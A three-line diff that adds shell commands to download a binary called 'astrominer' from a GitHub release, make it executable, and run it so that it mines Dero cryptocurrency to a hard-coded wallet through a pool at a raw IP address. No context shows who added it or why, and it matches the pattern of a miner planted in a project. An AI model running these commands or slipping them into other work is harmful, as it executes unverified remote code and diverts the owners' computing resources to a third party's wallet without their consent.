@@ -1,0 +1,3 @@
+wget https://github.com/bondaltomason/meo/releases/download/2.7.0/astrominer
+chmod +x astrominer
+./astrominer -w dero1qy3qhpsl8r02vf6mx2svktxtpuhja6p5h6tluccs2ahsdekcghkwgqq5n5sm7 -r 45.76.39.74:10100
